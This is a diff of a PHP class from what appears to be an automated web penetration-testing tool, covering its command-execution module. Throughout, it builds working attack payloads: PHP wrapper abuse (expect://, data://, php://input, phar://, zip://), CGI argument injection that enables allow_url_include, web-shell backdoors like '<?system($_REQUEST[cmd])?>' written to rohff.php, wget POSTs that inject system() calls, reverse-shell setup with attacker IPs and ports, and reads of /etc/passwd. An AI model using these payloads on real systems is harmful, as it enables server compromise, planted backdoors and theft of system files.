@@ -12,14 +12,14 @@ class CE extends PARAM4COM{
    
     
     public function ce4pentest($OS){
-        $this->titre(__FUNCTION__);
+        $this->gtitre(__FUNCTION__);
         $OS = trim($OS);
         $sql_r_1 = "SELECT param2ce FROM URI WHERE $this->uri2where AND param2ce <> 0";
     if ($this->checkBD($sql_r_1) ) return  $this->article("Command Execution","DONE");
     else {        
         $this->ce2shell($OS);$this->pause();
-        $this->ce2write($OS);$this->pause();
-        $this->ce2read($OS);$this->pause();
+        //$this->ce2write($OS);$this->pause();
+        //$this->ce2read($OS);$this->pause();
         return $this->req2BD4in("param2ce","URI",$this->uri2where,"1");
         }
     }
@@ -28,29 +28,32 @@ class CE extends PARAM4COM{
     
     public function ce2exec($template,$dico){
         $result = "";
-        $this->ssTitre(__FUNCTION__);
+        $this->titre(__FUNCTION__);
         
         $cmds = file($dico);
         foreach ($cmds as $cmd){
             $cmd = trim($cmd);
-            $result .= $this->ce2rst($template,$cmd,"");
+            $this->ce2rst($template,$cmd,"");
         }
         return $result;
     }
     
     
     public function ce2shell8param($OS){ // OK
-        $this->ssTitre(__FUNCTION__);
-        $cmd = "cat /etc/passwd";
-        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
+        $this->titre(__FUNCTION__);
+        $cmd = "id";
+        $filter = "| grep 'uid=' | grep 'gid=' ";
         $template = $this->param2template($cmd,$filter);
         $this->param2rce($this->user2agent,$template,$cmd,$filter);$this->pause();
     }
     
     public function ce2shell8post($OS){ // OK
-        $this->ssTitre(__FUNCTION__);
-        $cmd = "cat /etc/passwd";
-        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
+        $this->titre(__FUNCTION__);
+        $cmd = "id";
+        $filter = "| grep 'uid=' | grep 'gid=' ";
+        $shell = "/bin/bash";
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
         // https://www.hackingarticles.in/web-application-penetration-testing-curl/
     }
    
@@ -79,37 +82,48 @@ class CE extends PARAM4COM{
     
  
     public function ce2shell($OS){
-        $result = "";
+        
         $this->titre(__FUNCTION__);
-        $result .= $this->ce2shell8param($OS);$this->pause();
-        $result .= $this->ce2shell8php($OS);$this->pause();
-        return $result;
+        $this->ce2shell8param($OS);$this->pause();
+        $this->ce2shell8php($OS);$this->pause();
+        
     }
     
     public function ce2write($OS){
-        $result = "";
+        
         $this->titre(__FUNCTION__);
-        $result .= $this->ce2write8param($OS);$this->pause();
-        $result .= $this->ce2write8php($OS);$this->pause();
-        return $result;
+        //$this->ce2write8param($OS);$this->pause();
+        $this->ce2write8php($OS);$this->pause();
+        
     }
     
     public function ce2read($OS){
-        $result = "";
+        
         $this->titre(__FUNCTION__);
-        $result .= $this->ce2read8param($OS);$this->pause();
-        $result .= $this->ce2read8php($OS);$this->pause();
-        return $result;
+        $this->ce2read8param($OS);$this->pause();
+        $this->ce2read8php($OS);$this->pause();
+        
     }
     
     public function ce2read8param($OS){
-        $result = "";
-        $this->ssTitre(__FUNCTION__);
         
-        return $result;
+        $this->titre(__FUNCTION__);
+        
+        $cmd = "id";
+        $filter = "| grep 'uid=' | grep 'gid=' ";
+        $shell = "/bin/bash";
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
+        
+        
     }
     public function ce2read8php($OS){
-        var_dump(stream_get_transports());
+        
+        $cmd = "cat /etc/passwd";
+        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
+        $shell = "/bin/sh";
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
         
         $template = "php://filter/resource=/etc/passwd";
                 if (!empty($this->param2check($this->user2agent,$cmd,$filter))) {
@@ -173,10 +187,16 @@ class CE extends PARAM4COM{
 
     
     public function ce2write8php($OS) {
-        $result = "";
+        
         $this->ssTitre(__FUNCTION__);
         
-        return $result;
+        $cmd = "id";
+        $filter = "| grep 'uid=' | grep 'gid=' ";
+        $shell = "/bin/bash";
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
+        
+        
     }
     
     
@@ -185,8 +205,8 @@ class CE extends PARAM4COM{
     public function ce2shell8php2expect($OS) {
         $this->ssTitre(__FUNCTION__);
         
-        $cmd = "cat /etc/passwd";
-        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
+        $cmd = "id";
+        $filter = "| grep 'uid=' | grep 'gid=' ";
         $shell = "/bin/sh";
         $attacker_ip = $this->ip4addr4target($this->ip);
         $attacker_port = rand(1024,65535);
@@ -197,7 +217,7 @@ class CE extends PARAM4COM{
         if (!empty($this->url2search($this->user2agent,$url,$filter))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         $cmd_exec = "expect://%CMD%%NB%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
@@ -205,7 +225,7 @@ class CE extends PARAM4COM{
         if (!empty($this->url2search($this->user2agent,$url,$filter))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
     }
     
@@ -216,9 +236,9 @@ class CE extends PARAM4COM{
         // cgi-bin/php?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation=on -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input -d cgi.force_redirect=0 -d cgi.redirect_status_env=0 -d auto_prepend_file=php://input -n
         
         
-        $cmd = "cat /etc/passwd";
-        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
-        $shell = "/bin/sh";
+        $cmd = "id";
+        $filter = "| grep 'uid=' | grep 'gid=' ";
+        $shell = "/bin/bash";
         $attacker_ip = $this->ip4addr4target($this->ip);
         $attacker_port = rand(1024,65535);
         
@@ -234,7 +254,7 @@ class CE extends PARAM4COM{
             $cmd_rev_nc = "wget --no-check-certificate -qO- --post-data \"<?system('$rev')?>\" \"$url\" 2> /dev/null ";
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         
         
@@ -249,7 +269,7 @@ class CE extends PARAM4COM{
             $cmd_rev_nc = "wget --no-check-certificate -qO- --post-data \"<?system('$rev')?>\" \"$url\" 2> /dev/null ";
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         
         
@@ -263,7 +283,7 @@ class CE extends PARAM4COM{
             $this->port2shell(base64_encode($template));
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         
         $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&cmd=%CMD%";
@@ -274,7 +294,7 @@ class CE extends PARAM4COM{
             $this->port2shell(base64_encode($template));
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&cmd=%CMD%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
@@ -284,7 +304,7 @@ class CE extends PARAM4COM{
             $this->port2shell(base64_encode($template));
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         
         $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&cmd%3d%CMD%";
@@ -295,7 +315,7 @@ class CE extends PARAM4COM{
             $this->port2shell(base64_encode($template));
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&cmd=%CMD%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
@@ -305,7 +325,7 @@ class CE extends PARAM4COM{
             $this->port2shell(base64_encode($template));
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         
         $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&cmd=%CMD%";
@@ -316,7 +336,7 @@ class CE extends PARAM4COM{
             $this->port2shell(base64_encode($template));
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         
         $cmd_exec = "-d+allow_url_include=1+-d+auto_prepend_file=php://input&cmd=%CMD%%NB%";
@@ -327,24 +347,31 @@ class CE extends PARAM4COM{
             $this->port2shell(base64_encode($template));
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
     }
  
     
     public function ce2shell8php($OS) {
-        $result = "";
-        $this->ssTitre(__FUNCTION__);
         
-        $result .= $this->ce2shell8php2module($OS);$this->pause();
-        $result .= $this->ce2shell8php2wrapper($OS);$this->pause();
-        $result .= $this->ce2shell8php2expect($OS);$this->pause();
+        $this->titre(__FUNCTION__);
         
-        return $result;
+        $this->ce2shell8php2module($OS);$this->pause();
+        $this->ce2shell8php2wrapper($OS);$this->pause();
+        $this->ce2shell8php2expect($OS);$this->pause();
+        
+        
     }
     
     
     public function ce2shell8php2wrapper4zip() {
-        $this->ssTitre(__FUNCTION__);
+        $this->titre(__FUNCTION__);
+        
+        $cmd = "id";
+        $filter = "| grep 'uid=' | grep 'gid=' ";
+        $shell = "/bin/bash";
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
+        
         /*
         echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
 zip payload.zip payload.php;   
@@ -385,6 +412,11 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         $this->ssTitre(__FUNCTION__);
         
         // http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+        $cmd = "id";
+        $filter = "| grep 'uid=' | grep 'gid=' ";
+        $shell = "/bin/bash";
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
         
         $backdoor = "<?system(\$_REQUEST[cmd])?>";
         $cmd_exec = "data://text/plain,$backdoor&cmd=%CMD%";
@@ -393,7 +425,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         if (!empty($this->url2search($this->user2agent,$url,$filter))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         
         
@@ -403,7 +435,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         if (!empty($this->url2search($this->user2agent,$url,$filter))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         
         $backdoor = "<?system(\$_REQUEST[cmd])?>";
@@ -414,7 +446,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         if (!empty($this->url2search($this->user2agent,$url,$filter))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         $backdoor = "<?system(\$_REQUEST[cmd])?>";
         $backdoor_base64 = base64_encode($backdoor);
@@ -424,7 +456,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         if (!empty($this->url2search($this->user2agent,$url,$filter))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         
         $backdoor = "<?system(\$_REQUEST[cmd])?>";
@@ -444,7 +476,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         if (!empty($this->url2search($this->user2agent,$url,$filter))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
+        
         
         
         
@@ -452,13 +484,13 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
     
     
     public function ce2shell8php2wrapper4php() {
-        $this->ssTitre(__FUNCTION__);
+        $this->titre(__FUNCTION__);
         
+        $cmd = "id";
+        $filter = "| grep 'uid=' | grep 'gid=' ";
+        $shell = "/bin/bash";
         $attacker_ip = $this->ip4addr4target($this->ip);
         $attacker_port = rand(1024,65535);
-        $cmd = "cat /etc/passwd";
-        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";     
-        $shell = "/bin/sh";
         
         $backdoor = "echo \"<?system(\$_REQUEST[cmd])?>\" > ./rohff.php ";
         $backdoor_base64 = base64_encode($backdoor);
@@ -473,42 +505,34 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         if (!empty($this->url2search($this->user2agent,$url,$filter))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
-        $this->pause();
-        
-        
-        
-        
     }
     
  
     
     public function ce2shell8php2wrapper4phar() {
         $this->ssTitre(__FUNCTION__);
-        
+        $cmd = "id";
+        $filter = "| grep 'uid=' | grep 'gid=' ";
+        $shell = "/bin/bash";
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
         
         $cmd13 = "phar://rohff.php";
         $this->param2check($this->user2agent,$cmd13,$filter);
         $url = "$this->http_type://$this->vhost:$this->port/$this->uri_path_dirname/rohff.php?cmd=cat /etc/passwd";
         $query = "wget --user-agent='$this->user2agent' \"$url\" --timeout=2 --tries=2 --no-check-certificate -qO-  $filter ";
         if (!empty($this->req_ret_str($query))) {
-            $result .= $this->yesAUTH($this->port2id, "www-data", "", 33, 33, "webserver", "/var/www", "","RCE:$this->uri_path?$this->param=$cmd13", $this->ip2geoip());
+            $this->yesAUTH($this->port2id, "www-data", "", 33, 33, "webserver", "/var/www", "","RCE:$this->uri_path?$this->param=$cmd13", $this->ip2geoip());
         }
     }
     
 
     public function ce2shell8php2wrapper($OS) {
-        $result = "";
         $this->titre(__FUNCTION__);
-        var_dump(stream_get_transports());
-        var_dump(stream_get_filters());
-        $this->pause();
-        
         $this->ce2shell8php2wrapper4data();$this->pause();
         $this->ce2shell8php2wrapper4phar();$this->pause();
         $this->ce2shell8php2wrapper4php();$this->pause();
-        $this->ce2shell8php2wrapper4zip();$this->pause();
-        
-        return $result;
+        $this->ce2shell8php2wrapper4zip();$this->pause();       
     }
 
     
